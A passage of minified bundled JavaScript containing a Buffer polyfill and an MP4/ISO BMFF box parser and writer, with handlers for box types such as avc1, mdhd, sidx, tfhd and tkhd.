index");if(Z<=Y&&A<=B)return 0;if(Z<=Y)return-1;if(A<=B)return 1;if(this===H)return 0;var na=(Z>>>=0)-(Y>>>=0),T=(A>>>=0)-(B>>>=0),pa=Math.min(na,T);for(Y=this.slice(Y,Z),H=H.slice(B,A),B=0;B<pa;++B)if(Y[B]!==H[B]){na=Y[B],T=H[B];break}return na<T?-1:T<na?1:0},m.prototype.includes=function(H,B,A){return-1!==this.indexOf(H,B,A)},m.prototype.indexOf=function(H,B,A){return J(this,H,B,A,!0)},m.prototype.lastIndexOf=function(H,B,A){return J(this,H,B,A,!1)},m.prototype.write=function(H,B,A,Y){if(void 0===B)Y="utf8",A=this.length,B=0;else if(void 0===A&&"string"==typeof B)Y=B,A=this.length,B=0;else{if(!isFinite(B))throw Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");B>>>=0,isFinite(A)?(A>>>=0,void 0===Y&&(Y="utf8")):(Y=A,A=void 0)}var na,T,pa,Z=this.length-B;if((void 0===A||Z<A)&&(A=Z),0<H.length&&(0>A||0>B)||B>this.length)throw new RangeError("Attempt to write outside buffer bounds");for(Y=Y||"utf8",Z=!1;;)switch(Y){case"hex":a:{for(B=Number(B)||0,Y=this.length-B,(!A||Y<(A=Number(A)))&&(A=Y),(Y=H.length)/2<A&&(A=Y/2),Y=0;Y<A;++Y){var ia=parseInt(H.substr(2*Y,2),16);if(ia!=ia){A=Y;break a}this[B+Y]=ia}A=Y}return A;case"utf8":case"utf-8":return T=B,pa=A,O(F(H,this.length-T),this,T,pa);case"ascii":case"latin1":case"binary":return D(this,H,B,A);case"base64":return ia=B,na=A,O(P(H),this,ia,na);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":for(Y=A,ia=this.length-B,na=[],T=0;T<H.length&&!(0>(ia-=2));++T)A=(pa=H.charCodeAt(T))>>8,pa%=256,na.push(pa),na.push(A);return O(na,this,B,Y);default:if(Z)throw new TypeError("Unknown encoding: "+Y);Y=(""+Y).toLowerCase(),Z=!0}},m.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};var aa=4096;m.prototype.slice=function(H,B){var A=this.length;return 0>(H=~~H)?0>(H+=A)&&(H=0):A<H&&(H=A),0>(B=void 0===B?A:~~B)?0>(B+=A)&&(B=0):A<B&&(B=A),B<H&&(B=H),(H=this.subarray(H,B)).__proto__=m.prototype,H},m.prototype.readUIntLE=function(H,B,A){H>>>=0,B>>>=0,A||L(H,B,this.length),A=this[H];for(var Y=1,Z=0;++Z<B&&(Y*=256);)A+=this[H+Z]*Y;return A},m.prototype.readUIntBE=function(H,B,A){H>>>=0,B>>>=0,A||L(H,B,this.length),A=this[H+--B];for(var Y=1;0<B&&(Y*=256);)A+=this[H+--B]*Y;return A},m.prototype.readUInt8=function(H,B){return H>>>=0,B||L(H,1,this.length),this[H]},m.prototype.readUInt16LE=function(H,B){return H>>>=0,B||L(H,2,this.length),this[H]|this[H+1]<<8},m.prototype.readUInt16BE=function(H,B){return H>>>=0,B||L(H,2,this.length),this[H]<<8|this[H+1]},m.prototype.readUInt32LE=function(H,B){return H>>>=0,B||L(H,4,this.length),(this[H]|this[H+1]<<8|this[H+2]<<16)+16777216*this[H+3]},m.prototype.readUInt32BE=function(H,B){return H>>>=0,B||L(H,4,this.length),16777216*this[H]+(this[H+1]<<16|this[H+2]<<8|this[H+3])},m.prototype.readIntLE=function(H,B,A){H>>>=0,B>>>=0,A||L(H,B,this.length),A=this[H];for(var Y=1,Z=0;++Z<B&&(Y*=256);)A+=this[H+Z]*Y;return 128*Y<=A&&(A-=Math.pow(2,8*B)),A},m.prototype.readIntBE=function(H,B,A){H>>>=0,B>>>=0,A||L(H,B,this.length),A=B;for(var Y=1,Z=this[H+--A];0<A&&(Y*=256);)Z+=this[H+--A]*Y;return 128*Y<=Z&&(Z-=Math.pow(2,8*B)),Z},m.prototype.readInt8=function(H,B){return H>>>=0,B||L(H,1,this.length),128&this[H]?-1*(255-this[H]+1):this[H]},m.prototype.readInt16LE=function(H,B){return H>>>=0,B||L(H,2,this.length),32768&(H=this[H]|this[H+1]<<8)?4294901760|H:H},m.prototype.readInt16BE=function(H,B){return H>>>=0,B||L(H,2,this.length),32768&(H=this[H+1]|this[H]<<8)?4294901760|H:H},m.prototype.readInt32LE=function(H,B){return H>>>=0,B||L(H,4,this.length),this[H]|this[H+1]<<8|this[H+2]<<16|this[H+3]<<24},m.prototype.readInt32BE=function(H,B){return H>>>=0,B||L(H,4,this.length),this[H]<<24|this[H+1]<<16|this[H+2]<<8|this[H+3]},m.prototype.readFloatLE=function(H,B){return H>>>=0,B||L(H,4,this.length),ja.read(this,H,!0,23,4)},m.prototype.readFloatBE=function(H,B){return H>>>=0,B||L(H,4,this.length),ja.read(this,H,!1,23,4)},m.prototype.readDoubleLE=function(H,B){return H>>>=0,B||L(H,8,this.length),ja.read(this,H,!0,52,8)},m.prototype.readDoubleBE=function(H,B){return H>>>=0,B||L(H,8,this.length),ja.read(this,H,!1,52,8)},m.prototype.writeUIntLE=function(H,B,A,Y){H=+H,B>>>=0,A>>>=0,Y||G(this,H,B,A,Math.pow(2,8*A)-1,0),Y=1;var Z=0;for(this[B]=255&H;++Z<A&&(Y*=256);)this[B+Z]=H/Y&255;return B+A},m.prototype.writeUIntBE=function(H,B,A,Y){H=+H,B>>>=0,A>>>=0,Y||G(this,H,B,A,Math.pow(2,8*A)-1,0);var Z=1;for(this[B+(Y=A-1)]=255&H;0<=--Y&&(Z*=256);)this[B+Y]=H/Z&255;return B+A},m.prototype.writeUInt8=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,1,255,0),this[B]=255&H,B+1},m.prototype.writeUInt16LE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,2,65535,0),this[B]=255&H,this[B+1]=H>>>8,B+2},m.prototype.writeUInt16BE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,2,65535,0),this[B]=H>>>8,this[B+1]=255&H,B+2},m.prototype.writeUInt32LE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,4,4294967295,0),this[B+3]=H>>>24,this[B+2]=H>>>16,this[B+1]=H>>>8,this[B]=255&H,B+4},m.prototype.writeUInt32BE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,4,4294967295,0),this[B]=H>>>24,this[B+1]=H>>>16,this[B+2]=H>>>8,this[B+3]=255&H,B+4},m.prototype.writeIntLE=function(H,B,A,Y){var Z;H=+H,B>>>=0,Y||G(this,H,B,A,(Z=Math.pow(2,8*A-1))-1,-Z),Y=0,Z=1;var na=0;for(this[B]=255&H;++Y<A&&(Z*=256);)0>H&&0===na&&0!==this[B+Y-1]&&(na=1),this[B+Y]=(H/Z|0)-na&255;return B+A},m.prototype.writeIntBE=function(H,B,A,Y){var Z;H=+H,B>>>=0,Y||G(this,H,B,A,(Z=Math.pow(2,8*A-1))-1,-Z),Z=1;var na=0;for(this[B+(Y=A-1)]=255&H;0<=--Y&&(Z*=256);)0>H&&0===na&&0!==this[B+Y+1]&&(na=1),this[B+Y]=(H/Z|0)-na&255;return B+A},m.prototype.writeInt8=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,1,127,-128),0>H&&(H=255+H+1),this[B]=255&H,B+1},m.prototype.writeInt16LE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,2,32767,-32768),this[B]=255&H,this[B+1]=H>>>8,B+2},m.prototype.writeInt16BE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,2,32767,-32768),this[B]=H>>>8,this[B+1]=255&H,B+2},m.prototype.writeInt32LE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,4,2147483647,-2147483648),this[B]=255&H,this[B+1]=H>>>8,this[B+2]=H>>>16,this[B+3]=H>>>24,B+4},m.prototype.writeInt32BE=function(H,B,A){return H=+H,B>>>=0,A||G(this,H,B,4,2147483647,-2147483648),0>H&&(H=4294967295+H+1),this[B]=H>>>24,this[B+1]=H>>>16,this[B+2]=H>>>8,this[B+3]=255&H,B+4},m.prototype.writeFloatLE=function(H,B,A){return w(this,H,B,!0,A)},m.prototype.writeFloatBE=function(H,B,A){return w(this,H,B,!1,A)},m.prototype.writeDoubleLE=function(H,B,A){return h(this,H,B,!0,A)},m.prototype.writeDoubleBE=function(H,B,A){return h(this,H,B,!1,A)},m.prototype.copy=function(H,B,A,Y){if(!m.isBuffer(H))throw new TypeError("argument should be a Buffer");if(A=A||0,Y||0===Y||(Y=this.length),B>=H.length&&(B=H.length),B=B||0,0<Y&&Y<A&&(Y=A),Y===A||0===H.length||0===this.length)return 0;if(0>B)throw new RangeError("targetStart out of bounds");if(0>A||A>=this.length)throw new RangeError("Index out of range");if(0>Y)throw new RangeError("sourceEnd out of bounds");Y>this.length&&(Y=this.length),H.length-B<Y-A&&(Y=H.length-B+A);var Z=Y-A;if(this===H&&"function"==typeof Uint8Array.prototype.copyWithin)this.copyWithin(B,A,Y);else if(this===H&&A<B&&B<Y)for(Y=Z-1;0<=Y;--Y)H[Y+B]=this[Y+A];else Uint8Array.prototype.set.call(H,this.subarray(A,Y),B);return Z},m.prototype.fill=function(H,B,A,Y){if("string"==typeof H){if("string"==typeof B?(Y=B,B=0,A=this.length):"string"==typeof A&&(Y=A,A=this.length),void 0!==Y&&"string"!=typeof Y)throw new TypeError("encoding must be a string");if("string"==typeof Y&&!m.isEncoding(Y))throw new TypeError("Unknown encoding: "+Y);var Z;1===H.length&&(Z=H.charCodeAt(0),("utf8"===Y&&128>Z||"latin1"===Y)&&(H=Z))}else"number"==typeof H&&(H&=255);if(0>B||this.length<B||this.length<A)throw new RangeError("Out of range index");if(A<=B)return this;if(B>>>=0,A=void 0===A?this.length:A>>>0,"number"==typeof(H=H||0))for(Y=B;Y<A;++Y)this[Y]=H;else{var na=(Z=m.isBuffer(H)?H:m.from(H,Y)).length;if(0===na)throw new TypeError('The value "'+H+'" is invalid for argument "value"');for(Y=0;Y<A-B;++Y)this[Y+B]=Z[Y%na]}return this};var ma=/[^+/0-9A-Za-z-_]/g},{13:13,6:6}],9:[function(u,da,M){var v={parseBuffer:function(l){return new m(l).parse()},addBoxProcessor:function(l,f){"string"==typeof l&&"function"==typeof f&&(p.prototype._boxProcessors[l]=f)},createFile:function(){return new m},createBox:function(l,f,g){return l=p.create(l),f&&f.append(l,g),l},createFullBox:function(l,f,g){return(l=v.createBox(l,f,g)).version=0,l.flags=0,l},Utils:{}};v.Utils.dataViewToString=function(l,f){var g=f||"utf-8";if("undefined"!=typeof TextDecoder)return new TextDecoder(g).decode(l);f=[];var t=0;if("utf-8"===g)for(;t<l.byteLength;)128>(g=l.getUint8(t++))||(224>g?g=(31&g)<<6:(240>g?g=(15&g)<<12:(g=(7&g)<<18,g|=(63&l.getUint8(t++))<<12),g|=(63&l.getUint8(t++))<<6),g|=63&l.getUint8(t++)),f.push(String.fromCharCode(g));else for(;t<l.byteLength;)f.push(String.fromCharCode(l.getUint8(t++)));return f.join("")},v.Utils.utf8ToByteArray=function(l){var f;if("undefined"!=typeof TextEncoder)var g=(new TextEncoder).encode(l);else for(g=[],f=0;f<l.length;++f){var t=l.charCodeAt(f);128>t?g.push(t):(2048>t?g.push(192|t>>6):(65536>t?g.push(224|t>>12):(g.push(240|t>>18),g.push(128|63&t>>12)),g.push(128|63&t>>6)),g.push(128|63&t))}return g},v.Utils.appendBox=function(l,f,g){if(f._offset=l._cursor.offset,f._root=l._root?l._root:l,f._raw=l._raw,f._parent=l,-1!==g)if(null!=g){var t=-1;if("number"==typeof g)t=g;else{if("string"!=typeof g){if("object"!=typeof g||!g.type)return void l.boxes.push(f);g=g.type}for(var r=0;r<l.boxes.length;r++)if(g===l.boxes[r].type){t=r+1;break}}l.boxes.splice(t,0,f)}else l.boxes.push(f)},void 0!==M&&(M.parseBuffer=v.parseBuffer,M.addBoxProcessor=v.addBoxProcessor,M.createFile=v.createFile,M.createBox=v.createBox,M.createFullBox=v.createFullBox,M.Utils=v.Utils),v.Cursor=function(l){this.offset=void 0===l?0:l};var m=function(l){this._cursor=new v.Cursor,this.boxes=[],l&&(this._raw=new DataView(l))};m.prototype.fetch=function(l){return(l=this.fetchAll(l,!0)).length?l[0]:null},m.prototype.fetchAll=function(l,f){var g=[];return m._sweep.call(this,l,g,f),g},m.prototype.parse=function(){for(this._cursor.offset=0,this.boxes=[];this._cursor.offset<this._raw.byteLength;){var l=p.parse(this);if(void 0===l.type)break;this.boxes.push(l)}return this},m._sweep=function(l,f,g){for(var t in this.type&&this.type==l&&f.push(this),this.boxes){if(f.length&&g)break;m._sweep.call(this.boxes[t],l,f,g)}},m.prototype.write=function(){for(var l=0,f=0;f<this.boxes.length;f++)l+=this.boxes[f].getLength(!1);for(l=new Uint8Array(l),this._rawo=new DataView(l.buffer),this.bytes=l,f=this._cursor.offset=0;f<this.boxes.length;f++)this.boxes[f].write();return l.buffer},m.prototype.append=function(l,f){v.Utils.appendBox(this,l,f)};var p=function(){this._cursor=new v.Cursor};p.parse=function(l){var f=new p;return f._offset=l._cursor.offset,f._root=l._root?l._root:l,f._raw=l._raw,f._parent=l,f._parseBox(),l._cursor.offset=f._raw.byteOffset+f._raw.byteLength,f},p.create=function(l){var f=new p;return f.type=l,f.boxes=[],f},p.prototype._boxContainers="dinf edts mdia meco mfra minf moof moov mvex stbl strk traf trak tref udta vttc sinf schi encv enca".split(" "),p.prototype._boxProcessors={},p.prototype._procField=function(l,f,g){this._parsing?this[l]=this._readField(f,g):this._writeField(f,g,this[l])},p.prototype._procFieldArray=function(l,f,g,t){var r;if(this._parsing)for(this[l]=[],r=0;r<f;r++)this[l][r]=this._readField(g,t);else for(r=0;r<this[l].length;r++)this._writeField(g,t,this[l][r])},p.prototype._procFullBox=function(){this._procField("version","uint",8),this._procField("flags","uint",24)},p.prototype._procEntries=function(l,f,g){var t;if(this._parsing)for(this[l]=[],t=0;t<f;t++)this[l].push({}),g.call(this,this[l][t]);else for(t=0;t<f;t++)g.call(this,this[l][t])},p.prototype._procSubEntries=function(l,f,g,t){var r;if(this._parsing)for(l[f]=[],r=0;r<g;r++)l[f].push({}),t.call(this,l[f][r]);else for(r=0;r<g;r++)t.call(this,l[f][r])},p.prototype._procEntryField=function(l,f,g,t){this._parsing?l[f]=this._readField(g,t):this._writeField(g,t,l[f])},p.prototype._procSubBoxes=function(l,f){var g;if(this._parsing)for(this[l]=[],g=0;g<f;g++)this[l].push(p.parse(this));else for(g=0;g<f;g++)this._rawo?this[l][g].write():this.size+=this[l][g].getLength()},p.prototype._readField=function(l,f){switch(l){case"uint":return this._readUint(f);case"int":return this._readInt(f);case"template":return this._readTemplate(f);case"string":return-1===f?this._readTerminatedString():this._readString(f);case"data":return this._readData(f);case"utf8":return this._readUTF8String();default:return-1}},p.prototype._readInt=function(l){var f=null,g=this._cursor.offset-this._raw.byteOffset;switch(l){case 8:f=this._raw.getInt8(g);break;case 16:f=this._raw.getInt16(g);break;case 32:f=this._raw.getInt32(g);break;case 64:f=this._raw.getInt32(g),g=this._raw.getInt32(4+g),f=f*Math.pow(2,32)+g}return this._cursor.offset+=l>>3,f},p.prototype._readUint=function(l){var f=null,g=this._cursor.offset-this._raw.byteOffset;switch(l){case 8:f=this._raw.getUint8(g);break;case 16:f=this._raw.getUint16(g);break;case 24:f=(this._raw.getUint16(g)<<8)+this._raw.getUint8(2+g);break;case 32:f=this._raw.getUint32(g);break;case 64:f=this._raw.getUint32(g),g=this._raw.getUint32(4+g),f=f*Math.pow(2,32)+g}return this._cursor.offset+=l>>3,f},p.prototype._readString=function(l){for(var f="",g=0;g<l;g++){var t=this._readUint(8);f+=String.fromCharCode(t)}return f},p.prototype._readTemplate=function(l){return this._readUint(l/2)+this._readUint(l/2)/Math.pow(2,l/2)},p.prototype._readTerminatedString=function(){for(var l="";this._cursor.offset-this._offset<this._raw.byteLength;){var f=this._readUint(8);if(0===f)break;l+=String.fromCharCode(f)}return l},p.prototype._readData=function(l){if(0<(l=0<l?l:this._raw.byteLength-(this._cursor.offset-this._offset))){var f=new Uint8Array(this._raw.buffer,this._cursor.offset,l);return this._cursor.offset+=l,f}return null},p.prototype._readUTF8String=function(){var l=this._raw.byteLength-(this._cursor.offset-this._offset),f=null;return 0<l&&(f=new DataView(this._raw.buffer,this._cursor.offset,l),this._cursor.offset+=l),f?v.Utils.dataViewToString(f):f},p.prototype._parseBox=function(){if(this._parsing=!0,this._cursor.offset=this._offset,this._offset+8>this._raw.buffer.byteLength)this._root._incomplete=!0;else{switch(this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this.size){case 0:this._raw=new DataView(this._raw.buffer,this._offset,this._raw.byteLength-this._cursor.offset+8);break;case 1:this._offset+this.size>this._raw.buffer.byteLength?(this._incomplete=!0,this._root._incomplete=!0):this._raw=new DataView(this._raw.buffer,this._offset,this.largesize);break;default:this._offset+this.size>this._raw.buffer.byteLength?(this._incomplete=!0,this._root._incomplete=!0):this._raw=new DataView(this._raw.buffer,this._offset,this.size)}this._incomplete||(this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type)?this._parseContainerBox():this._data=this._readData())}},p.prototype._parseFullBox=function(){this.version=this._readUint(8),this.flags=this._readUint(24)},p.prototype._parseContainerBox=function(){for(this.boxes=[];this._cursor.offset-this._raw.byteOffset<this._raw.byteLength;)this.boxes.push(p.parse(this))},p.prototype.append=function(l,f){v.Utils.appendBox(this,l,f)},p.prototype.getLength=function(){if(this._parsing=!1,this._rawo=null,this.size=0,this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type))for(var l=0;l<this.boxes.length;l++)this.size+=this.boxes[l].getLength();return this._data&&this._writeData(this._data),this.size},p.prototype.write=function(){switch(this._parsing=!1,this._cursor.offset=this._parent._cursor.offset,this.size){case 0:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.parent._rawo.byteLength-this._cursor.offset);break;case 1:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.largesize);break;default:this._rawo=new DataView(this._parent._rawo.buffer,this._cursor.offset,this.size)}if(this._procField("size","uint",32),this._procField("type","string",4),1===this.size&&this._procField("largesize","uint",64),"uuid"===this.type&&this._procFieldArray("usertype",16,"uint",8),this._boxProcessors[this.type]&&this._boxProcessors[this.type].call(this),-1!==this._boxContainers.indexOf(this.type))for(var l=0;l<this.boxes.length;l++)this.boxes[l].write();return this._data&&this._writeData(this._data),this._parent._cursor.offset+=this.size,this.size},p.prototype._writeInt=function(l,f){if(this._rawo){var g=this._cursor.offset-this._rawo.byteOffset;switch(l){case 8:this._rawo.setInt8(g,f);break;case 16:this._rawo.setInt16(g,f);break;case 32:this._rawo.setInt32(g,f);break;case 64:var t=Math.floor(f/Math.pow(2,32));f-=t*Math.pow(2,32),this._rawo.setUint32(g,t),this._rawo.setUint32(4+g,f)}this._cursor.offset+=l>>3}else this.size+=l>>3},p.prototype._writeUint=function(l,f){if(this._rawo){var g=this._cursor.offset-this._rawo.byteOffset;switch(l){case 8:this._rawo.setUint8(g,f);break;case 16:this._rawo.setUint16(g,f);break;case 24:var t=255&f;this._rawo.setUint16(g,(16776960&f)>>8),this._rawo.setUint8(2+g,t);break;case 32:this._rawo.setUint32(g,f);break;case 64:t=f-(f=Math.floor(f/Math.pow(2,32)))*Math.pow(2,32),this._rawo.setUint32(g,f),this._rawo.setUint32(4+g,t)}this._cursor.offset+=l>>3}else this.size+=l>>3},p.prototype._writeString=function(l,f){for(var g=0;g<l;g++)this._writeUint(8,f.charCodeAt(g))},p.prototype._writeTerminatedString=function(l){if(0!==l.length){for(var f=0;f<l.length;f++)this._writeUint(8,l.charCodeAt(f));this._writeUint(8,0)}},p.prototype._writeTemplate=function(l,f){var g=Math.floor(f);f=(f-g)*Math.pow(2,l/2),this._writeUint(l/2,g),this._writeUint(l/2,f)},p.prototype._writeData=function(l){if(l)if(this._rawo){if(l instanceof Array){for(var f=this._cursor.offset-this._rawo.byteOffset,g=0;g<l.length;g++)this._rawo.setInt8(f+g,l[g]);this._cursor.offset+=l.length}l instanceof Uint8Array&&(this._root.bytes.set(l,this._cursor.offset),this._cursor.offset+=l.length)}else this.size+=l.length},p.prototype._writeUTF8String=function(l){if(l=v.Utils.utf8ToByteArray(l),this._rawo)for(var f=new DataView(this._rawo.buffer,this._cursor.offset,l.length),g=0;g<l.length;g++)f.setUint8(g,l[g]);else this.size+=l.length},p.prototype._writeField=function(l,f,g){switch(l){case"uint":this._writeUint(f,g);break;case"int":this._writeInt(f,g);break;case"template":this._writeTemplate(f,g);break;case"string":-1==f?this._writeTerminatedString(g):this._writeString(f,g);break;case"data":this._writeData(g);break;case"utf8":this._writeUTF8String(g)}},p.prototype._boxProcessors.avc1=p.prototype._boxProcessors.encv=function(){this._procFieldArray("reserved1",6,"uint",8),this._procField("data_reference_index","uint",16),this._procField("pre_defined1","uint",16),this._procField("reserved2","uint",16),this._procFieldArray("pre_defined2",3,"uint",32),this._procField("width","uint",16),this._procField("height","uint",16),this._procField("horizresolution","template",32),this._procField("vertresolution","template",32),this._procField("reserved3","uint",32),this._procField("frame_count","uint",16),this._procFieldArray("compressorname",32,"uint",8),this._procField("depth","uint",16),this._procField("pre_defined3","int",16),this._procField("config","data",-1)},p.prototype._boxProcessors.dref=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procSubBoxes("entries",this.entry_count)},p.prototype._boxProcessors.elst=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procEntries("entries",this.entry_count,(function(l){this._procEntryField(l,"segment_duration","uint",1===this.version?64:32),this._procEntryField(l,"media_time","int",1===this.version?64:32),this._procEntryField(l,"media_rate_integer","int",16),this._procEntryField(l,"media_rate_fraction","int",16)}))},p.prototype._boxProcessors.emsg=function(){this._procFullBox(),1==this.version?(this._procField("timescale","uint",32),this._procField("presentation_time","uint",64),this._procField("event_duration","uint",32),this._procField("id","uint",32),this._procField("scheme_id_uri","string",-1),this._procField("value","string",-1)):(this._procField("scheme_id_uri","string",-1),this._procField("value","string",-1),this._procField("timescale","uint",32),this._procField("presentation_time_delta","uint",32),this._procField("event_duration","uint",32),this._procField("id","uint",32)),this._procField("message_data","data",-1)},p.prototype._boxProcessors.free=p.prototype._boxProcessors.skip=function(){this._procField("data","data",-1)},p.prototype._boxProcessors.frma=function(){this._procField("data_format","uint",32)},p.prototype._boxProcessors.ftyp=p.prototype._boxProcessors.styp=function(){this._procField("major_brand","string",4),this._procField("minor_version","uint",32);var l=-1;this._parsing&&(l=(this._raw.byteLength-(this._cursor.offset-this._raw.byteOffset))/4),this._procFieldArray("compatible_brands",l,"string",4)},p.prototype._boxProcessors.hdlr=function(){this._procFullBox(),this._procField("pre_defined","uint",32),this._procField("handler_type","string",4),this._procFieldArray("reserved",3,"uint",32),this._procField("name","string",-1)},p.prototype._boxProcessors.mdat=function(){this._procField("data","data",-1)},p.prototype._boxProcessors.mdhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("timescale","uint",32),this._procField("duration","uint",1==this.version?64:32),this._parsing||"string"!=typeof this.language||(this.language=this.language.charCodeAt(0)-96<<10|this.language.charCodeAt(1)-96<<5|this.language.charCodeAt(2)-96),this._procField("language","uint",16),this._parsing&&(this.language=String.fromCharCode(96+(this.language>>10&31),96+(this.language>>5&31),96+(31&this.language))),this._procField("pre_defined","uint",16)},p.prototype._boxProcessors.mehd=function(){this._procFullBox(),this._procField("fragment_duration","uint",1==this.version?64:32)},p.prototype._boxProcessors.mfhd=function(){this._procFullBox(),this._procField("sequence_number","uint",32)},p.prototype._boxProcessors.mfro=function(){this._procFullBox(),this._procField("mfra_size","uint",32)},p.prototype._boxProcessors.mp4a=p.prototype._boxProcessors.enca=function(){this._procFieldArray("reserved1",6,"uint",8),this._procField("data_reference_index","uint",16),this._procFieldArray("reserved2",2,"uint",32),this._procField("channelcount","uint",16),this._procField("samplesize","uint",16),this._procField("pre_defined","uint",16),this._procField("reserved3","uint",16),this._procField("samplerate","template",32),this._procField("esds","data",-1)},p.prototype._boxProcessors.mvhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("timescale","uint",32),this._procField("duration","uint",1==this.version?64:32),this._procField("rate","template",32),this._procField("volume","template",16),this._procField("reserved1","uint",16),this._procFieldArray("reserved2",2,"uint",32),this._procFieldArray("matrix",9,"template",32),this._procFieldArray("pre_defined",6,"uint",32),this._procField("next_track_ID","uint",32)},p.prototype._boxProcessors.payl=function(){this._procField("cue_text","utf8")},p.prototype._boxProcessors.pssh=function(){this._procFullBox(),this._procFieldArray("SystemID",16,"uint",8),this._procField("DataSize","uint",32),this._procFieldArray("Data",this.DataSize,"uint",8)},p.prototype._boxProcessors.schm=function(){this._procFullBox(),this._procField("scheme_type","uint",32),this._procField("scheme_version","uint",32),1&this.flags&&this._procField("scheme_uri","string",-1)},p.prototype._boxProcessors.sdtp=function(){this._procFullBox();var l=-1;this._parsing&&(l=this._raw.byteLength-(this._cursor.offset-this._raw.byteOffset)),this._procFieldArray("sample_dependency_table",l,"uint",8)},p.prototype._boxProcessors.sidx=function(){this._procFullBox(),this._procField("reference_ID","uint",32),this._procField("timescale","uint",32),this._procField("earliest_presentation_time","uint",1==this.version?64:32),this._procField("first_offset","uint",1==this.version?64:32),this._procField("reserved","uint",16),this._procField("reference_count","uint",16),this._procEntries("references",this.reference_count,(function(l){this._parsing||(l.reference=(1&l.reference_type)<<31,l.reference|=2147483647&l.referenced_size,l.sap=(1&l.starts_with_SAP)<<31,l.sap|=(3&l.SAP_type)<<28,l.sap|=268435455&l.SAP_delta_time),this._procEntryField(l,"reference","uint",32),this._procEntryField(l,"subsegment_duration","uint",32),this._procEntryField(l,"sap","uint",32),this._parsing&&(l.reference_type=l.reference>>31&1,l.referenced_size=2147483647&l.reference,l.starts_with_SAP=l.sap>>31&1,l.SAP_type=l.sap>>28&7,l.SAP_delta_time=268435455&l.sap)}))},p.prototype._boxProcessors.smhd=function(){this._procFullBox(),this._procField("balance","uint",16),this._procField("reserved","uint",16)},p.prototype._boxProcessors.ssix=function(){this._procFullBox(),this._procField("subsegment_count","uint",32),this._procEntries("subsegments",this.subsegment_count,(function(l){this._procEntryField(l,"ranges_count","uint",32),this._procSubEntries(l,"ranges",l.ranges_count,(function(f){this._procEntryField(f,"level","uint",8),this._procEntryField(f,"range_size","uint",24)}))}))},p.prototype._boxProcessors.stsd=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procSubBoxes("entries",this.entry_count)},p.prototype._boxProcessors.subs=function(){this._procFullBox(),this._procField("entry_count","uint",32),this._procEntries("entries",this.entry_count,(function(l){this._procEntryField(l,"sample_delta","uint",32),this._procEntryField(l,"subsample_count","uint",16),this._procSubEntries(l,"subsamples",l.subsample_count,(function(f){this._procEntryField(f,"subsample_size","uint",1===this.version?32:16),this._procEntryField(f,"subsample_priority","uint",8),this._procEntryField(f,"discardable","uint",8),this._procEntryField(f,"codec_specific_parameters","uint",32)}))}))},p.prototype._boxProcessors.tenc=function(){this._procFullBox(),this._procField("default_IsEncrypted","uint",24),this._procField("default_IV_size","uint",8),this._procFieldArray("default_KID",16,"uint",8)},p.prototype._boxProcessors.tfdt=function(){this._procFullBox(),this._procField("baseMediaDecodeTime","uint",1==this.version?64:32)},p.prototype._boxProcessors.tfhd=function(){this._procFullBox(),this._procField("track_ID","uint",32),1&this.flags&&this._procField("base_data_offset","uint",64),2&this.flags&&this._procField("sample_description_offset","uint",32),8&this.flags&&this._procField("default_sample_duration","uint",32),16&this.flags&&this._procField("default_sample_size","uint",32),32&this.flags&&this._procField("default_sample_flags","uint",32)},p.prototype._boxProcessors.tfra=function(){this._procFullBox(),this._procField("track_ID","uint",32),this._parsing||(this.reserved=0,this.reserved|=(48&this.length_size_of_traf_num)<<4,this.reserved|=(12&this.length_size_of_trun_num)<<2,this.reserved|=3&this.length_size_of_sample_num),this._procField("reserved","uint",32),this._parsing&&(this.length_size_of_traf_num=(48&this.reserved)>>4,this.length_size_of_trun_num=(12&this.reserved)>>2,this.length_size_of_sample_num=3&this.reserved),this._procField("number_of_entry","uint",32),this._procEntries("entries",this.number_of_entry,(function(l){this._procEntryField(l,"time","uint",1===this.version?64:32),this._procEntryField(l,"moof_offset","uint",1===this.version?64:32),this._procEntryField(l,"traf_number","uint",8*(this.length_size_of_traf_num+1)),this._procEntryField(l,"trun_number","uint",8*(this.length_size_of_trun_num+1)),this._procEntryField(l,"sample_number","uint",8*(this.length_size_of_sample_num+1))}))},p.prototype._boxProcessors.tkhd=function(){this._procFullBox(),this._procField("creation_time","uint",1==this.version?64:32),this._procField("modification_time","uint",1==this.version?64:32),this._procField("track_ID","uint",32),this._procField("reserved1","uint",32),this._procField("duration","uint",1==this.version?64:32),this._procFieldArray("reserved2",2,"uint",32),this._procField("layer","uint",16),this._procField("alternate_group","uint",16),this._procField("volume","template",16),this._procField("reserved3","uint",16),this._procFieldArray("matrix",9,"template",32),this._procField("width","template",32),this._procField("height","template",32)},p.prototype._boxProcessors.trex=function(){this._procFullBox(),this._procField("track_ID","uint",32),this._procField("default_sample_description_index","uint",32),this._procField("default_sample_duration","uint",32),this._procField("default_sample_size","uint",32),this._procField("default_sample_flags","uint",32)},p.prototype._boxProcessors.trun=function(){this._procFullBox(),this._procField("sample_count","uint",32),1&this